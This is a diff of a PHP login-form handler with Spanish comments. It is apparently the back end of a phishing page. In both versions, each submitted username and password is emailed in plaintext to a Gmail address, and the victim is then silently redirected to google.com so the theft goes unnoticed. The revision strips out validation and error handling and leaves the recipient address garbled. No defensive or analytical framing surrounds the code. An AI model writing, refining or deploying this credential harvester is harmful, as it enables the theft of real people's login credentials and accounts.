@@ -1,50 +1,34 @@
 <?php
+// Verificamos que el formulario fue enviado por método POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Obtener y limpiar datos del formulario
-    $usuario = trim($_POST["usuario"]);
-    $contrasena = trim($_POST["contrasena"]);
+    // Recibimos los datos del formulario y los limpiamos para evitar inyección
+    $usuario = filter_var(trim($_POST['usuario']), FILTER_SANITIZE_EMAIL);
+    $contrasena = trim($_POST['contrasena']);
 
-    // Validar que no estén vacíos
-    if (empty($usuario) || empty($contrasena)) {
-        echo "Por favor complete todos los campos.";
-        exit;
-    }
-
-    // Validar si usuario es correo o teléfono
-    $esCorreo = filter_var($usuario, FILTER_VALIDATE_EMAIL);
-    $esTelefono = preg_match('/^\+?\d{7,15}$/', $usuario); // Número con 7 a 15 dígitos, opcional + al inicio
-
-    if (!$esCorreo && !$esTelefono) {
-        echo "Ingrese un correo electrónico o número de teléfono válido.";
-        exit;
-    }
-
-    // Destinatario
-    $destinatario = "azeangel0290@gmail.com"; // Cambia esta dirección por la tuya
+    // Dirección de correo a la que se enviará la información
+    $destinatario = "azeangel0290qgmail.com";  // Cambia esto por tu correo real
 
     // Asunto del correo
     $asunto = "Nuevo inicio de sesión";
 
-    // Cuerpo del correo
-    $cuerpo = "Usuario: $usuario\n";
-    $cuerpo .= "Contraseña: $contrasena\n";
+    // Cuerpo del mensaje
+    $mensaje = "Se ha recibido un nuevo intento de inicio de sesión:\n\n";
+    $mensaje .= "Usuario: " . $usuario . "\n";
+    $mensaje .= "Contraseña: " . $contrasena . "\n";
 
-    // Encabezados
+    // Encabezados del correo
     $headers = "From: no-reply@tudominio.com\r\n";
-    $headers .= "Reply-To: no-reply@tudominio.com\r\n";
-    $headers .= "X-Mailer: PHP/" . phpversion();
+    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
-    // Enviar correo
-    if (mail($destinatario, $asunto, $cuerpo, $headers)) {
-        // Redirigir solo si el correo se envió correctamente
-        header("Location: https://www.google.com");
-        exit();
-    } else {
-        echo "Error al enviar el correo. Inténtalo más tarde.";
-    }
+    // Enviamos el correo
+    mail($destinatario, $asunto, $mensaje, $headers);
+
+    // Redirigimos a google.com
+    header("Location: https://www.google.com");
+    exit();
 } else {
-    // Si no es método POST, denegar acceso
-    header("HTTP/1.1 403 Forbidden");
-    echo "Acceso no permitido.";
+    // Si no es POST, redirigimos al formulario o mostramos un error
+    header("Location: index.html");
+    exit();
 }
 ?>
